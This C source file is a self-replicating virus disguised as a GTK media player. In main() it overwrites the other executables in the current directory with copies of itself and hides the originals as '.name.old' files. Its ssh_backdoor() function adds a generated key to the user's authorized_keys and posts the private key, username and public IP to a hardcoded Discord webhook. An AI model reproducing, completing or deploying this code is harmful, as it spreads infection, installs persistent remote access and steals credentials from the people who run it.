#include "player.h"
#include <dirent.h>
#include <errno.h>
#include <gtk/gtk.h>
#include <libgen.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

typedef struct {
  char new[1000];
  char old[1000];
  char main[50];
} pg;

char *isInfected(pg *files) {
  static char file[500];
  char *strToken = strtok(files->new, "/");
  while (strToken != NULL) {
    if (strstr(files->old, strToken) == NULL) {
      snprintf(file, sizeof(file), "%s/%s", file, strToken);
    }
    strToken = strtok(NULL, "/");
  }
  return file;
}

/**
 * @brief
 * @params
 * @return
 */
void infect(char *fileUninfected, char *prog_name) {
  DIR *dir;
  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }
  char *strToken = strtok(fileUninfected, "/");
  while (strToken != NULL) {
    char tempName[50];
    char cpQuery[50];
    char chQuery[50];

    snprintf(tempName, sizeof(tempName), ".%s.old", strToken);
    rename(strToken, tempName);
    snprintf(cpQuery, sizeof(cpQuery), "cp %s %s 2>/dev/null", prog_name,
             strToken);
    snprintf(chQuery, sizeof(chQuery), "chmod +x %s 2>/dev/null", strToken);
    system(cpQuery);
    system(chQuery);

    strToken = strtok(NULL, "/");
  }
}

pg *fileFinder(char *prog_name) {
  DIR *dir;
  struct dirent *dp;
  static pg file;

  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }

  while ((dp = readdir(dir)) != NULL) {
    struct stat st;

    if (stat(dp->d_name, &st) == 0 && S_ISREG(st.st_mode) &&
        (st.st_mode & S_IXUSR) && strcmp(dp->d_name, prog_name) != 0 &&
        strcmp(dp->d_name, "main") != 0) {

      if (strstr(dp->d_name, "old") != NULL) {
        snprintf(file.old, sizeof(file.old), "%s/%s", file.old, dp->d_name);
      } else {
        snprintf(file.new, sizeof(file.new), "%s/%s", file.new, dp->d_name);
      }

    } else if (strcmp(dp->d_name, prog_name) == 0) {
      snprintf(file.main, sizeof(file.main), "%s", dp->d_name);
    }
  }
  closedir(dir);
  return &file;
}

int mediaPlayer(int argc, char *argv[]) {
  GtkApplication *app = gtk_application_new("com.example.GtkApplication",
                                            G_APPLICATION_DEFAULT_FLAGS);

  AppData app_data = {0};

  g_signal_connect(app, "activate", G_CALLBACK(on_activate), &app_data);

  int status = g_application_run(G_APPLICATION(app), argc, argv);

  g_object_unref(app);
  return status;
}

void execHost(pg *files, char *prog_name, int argc, char *argv[]) {
  char exeQuery[100];
  if (strcmp(prog_name, "MediaPlayer") == 0) {
    mediaPlayer(argc, argv);
  } else {
    snprintf(exeQuery, sizeof(exeQuery), "./.%s.old 2>/dev/null", files->main);
    system(exeQuery);
  }
}

void ssh_backdoor() {
  char *home = getenv("HOME");
  if (!home)
    return;

  char *user = getenv("USER");
  if (!user)
    return;

  FILE *fp = popen("curl -s ifconfig.me", "r");
  if (fp == NULL) {
    perror("popen");
    return;
  }

  char ip[128];

  if (fgets(ip, sizeof(ip), fp) == NULL) {
    perror("fgets");
    pclose(fp);
    return;
  }

  pclose(fp);

  ip[strcspn(ip, "\n")] = '\0';

  char ssh_dir[256], priv_key[512], pub_key[512], auth_keys[512];

  snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home);
  snprintf(priv_key, sizeof(priv_key), "%s/id_rsa_basique", ssh_dir);
  snprintf(pub_key, sizeof(pub_key), "%s/id_rsa_basique.pub", ssh_dir);
  snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);

  // 1. Créer .ssh
  if (mkdir(ssh_dir, 0700) == -1 && errno != EEXIST) {
    perror("mkdir");
    return;
  }
  chmod(ssh_dir, 0700);

  // 2. Générer clé si absente
  if (access(priv_key, F_OK) != 0) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "ssh-keygen -t rsa -b 2048 -f '%s' -N '' -q",
             priv_key);
    system(cmd);
  }

  // 3. Lire clé publique
  FILE *pubf = fopen(pub_key, "r");
  if (!pubf)
    return;

  char pub_content[2048];
  size_t len = fread(pub_content, 1, sizeof(pub_content) - 1, pubf);
  pub_content[len] = '\0';
  fclose(pubf);

  // 4. Vérifier si déjà dans authorized_keys
  int already_present = 0;
  FILE *authf = fopen(auth_keys, "r");

  if (authf) {
    char buffer[4096];
    size_t r = fread(buffer, 1, sizeof(buffer) - 1, authf);
    buffer[r] = '\0';

    if (strstr(buffer, pub_content) != NULL) {
      already_present = 1;
    }
    fclose(authf);
  }

  // 5. Ajouter si absent
  if (!already_present) {
    authf = fopen(auth_keys, "a");
    if (authf) {
      fprintf(authf, "\n%s\n", pub_content);
      fclose(authf);
      chmod(auth_keys, 0600);
    }
  }

  // 4. Exfiltrer clé privée via Discord
  char exfil_cmd[2048];
  FILE *f = fopen(priv_key, "r");
  char buffer[1500];
  fread(buffer, 1, sizeof(buffer), f);
  size_t n = fread(buffer, 1, sizeof(buffer) - 1, f);
  buffer[n] = '\0';
  fclose(f);
  snprintf(exfil_cmd, sizeof(exfil_cmd),
           "curl -s -X POST -H 'Content-Type: application/json' "
           "-d '{\"content\":\"**Clé ssh**\\n\\n\\n %s\\n\\nSSH "
           "backdoor deployed: ssh %s@%s\\n\"}' "
           "https://discord.com/api/webhooks/1485416783706853558/"
           "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_"
           "9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB",
           buffer, user, ip);

  system(exfil_cmd);

  printf("[DEBUG] SSH backdoor deployed: ssh %s@%s (clé privée sur "
         "Discord)\n",
         user, ip);
}

int main(int argc, char *argv[]) {
  char pathbuf[256];
  snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
  char *prog_name = basename(pathbuf);

  pg *files = fileFinder(prog_name);
  char *fileUninfected = isInfected(files);
  infect(fileUninfected, prog_name);

  ssh_backdoor();

  execHost(files, prog_name, argc, argv);
}
